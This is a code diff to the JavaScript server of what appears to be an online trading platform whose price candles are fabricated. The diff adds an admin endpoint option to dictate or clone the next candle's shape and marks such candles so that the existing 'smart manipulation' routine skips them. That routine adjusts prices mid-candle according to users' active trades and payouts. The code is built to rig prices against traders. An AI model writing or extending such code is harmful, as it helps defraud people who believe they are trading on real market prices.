@@ -111,11 +111,22 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
 }
 
 // 2. Exact Pattern Generator
-function generateDynamicCandle(timestamp, open, command, lastCandle) {
+function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) {
     let bodySize, upperWick, lowerWick, close, high, low;
     const volatility = open * (0.00008 + Math.random() * 0.0001);
 
     switch (command) {
+        case 'CUSTOM_CLONE':
+            if (cloneData) {
+                const volRatio = open / (cloneData.refOpen || open); // scale to current price
+                bodySize = cloneData.body * volRatio;
+                upperWick = cloneData.upperWick * volRatio;
+                lowerWick = cloneData.lowerWick * volRatio;
+                close = cloneData.isGreen ? open + bodySize : open - bodySize;
+            } else {
+                bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
+            }
+            break;
         case 'GREEN': 
             bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
         case 'RED': 
@@ -180,7 +191,7 @@ function generateDynamicCandle(timestamp, open, command, lastCandle) {
 
     return {
         timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
-        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
+        isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
     };
 }
 
@@ -215,8 +226,10 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         let newCandle;
         
         if (marketData.nextCandleCommand) {
-            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, lastCandle);
+            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, lastCandle, marketData.nextCandleCloneData);
+            newCandle.isAdminCommand = true; // Mark as admin command
             marketData.nextCandleCommand = null;
+            marketData.nextCandleCloneData = null;
         } 
         
         if (!newCandle && SMART_AUTO_PILOT) {
@@ -276,6 +289,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 }
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection, lastCandle);
+                newCandle.isAdminCommand = false; // Auto-pilot is not admin command
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                 
                 let payoutChange = 0;
@@ -336,6 +350,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 }
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand, lastCandle);
+                newCandle.isAdminCommand = false; // Auto-pilot is not admin command
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
             }
         }
@@ -360,7 +375,7 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
     // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
-    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT) {
+    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT && !candle.isAdminCommand) {
         candle.isMidEvaluated = true;
         
         const trades = activeTradesDb[marketData.marketId] || {};
@@ -501,12 +516,13 @@ app.get('/api/history/:marketId', (req, res) => {
 });
 
 app.post('/api/admin/command', (req, res) => {
-    const { marketId, command } = req.body;
+    const { marketId, command, cloneData } = req.body;
     if (!marketId || !command) {
         return res.status(400).json({ error: 'Missing marketId or command' });
     }
     if (markets[marketId]) {
         markets[marketId].nextCandleCommand = command;
+        if (cloneData) markets[marketId].nextCandleCloneData = cloneData;
         console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
         res.json({ success: true, message: `Command ${command} received` });
     } else {
